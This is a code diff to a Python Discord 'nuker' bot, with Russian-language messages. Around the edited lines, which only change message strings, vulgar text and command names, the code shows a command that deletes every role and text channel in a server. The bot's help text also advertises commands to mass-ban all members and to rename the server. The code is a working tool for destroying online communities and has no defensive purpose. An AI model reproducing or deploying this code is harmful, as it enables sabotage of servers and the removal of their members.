@@ -35,7 +35,7 @@ async def createrole(ctx):
 @client.command()
 async def kakashka(ctx):
     await ctx.message.delete()
-    await ctx.author.send(f'Краш сервера `{ctx.guild}` (id: {ctx.guild.id}) запущен!')
+    await ctx.author.send(f'ебля сервера `{ctx.guild}` (id: {ctx.guild.id}) запущена!')
     for rl in ctx.guild.roles:
         create_task(killobject(obj=rl))
     for channel in ctx.guild.text_channels:
@@ -73,7 +73,7 @@ async def trahat(ctx):
 async def sosiloh(ctx):
     await ctx.message.delete()
     try:
-        await ctx.author.send(embed=discord.Embed(title='FastestNuker',description=f'`!kill` - авто краш сервера\n`!rename` - сменить иконку и имя серверу\n`!banall` - бан всех участников сервера',colour=discord.Colour.from_rgb(228,66,0)))
+        await ctx.author.send(embed=discord.Embed(title='бот никарасека',description=f'`?kakashka - краш \n`?dermo` - сменить иконку и имя серверу\n`?trahat` - бан всех участников сервера',colour=discord.Colour.from_rgb(228,66,0)))
     except:
         await ctx.send(embed=discord.Embed(title='Открой личку чтобы чекнуть хелп'))
 
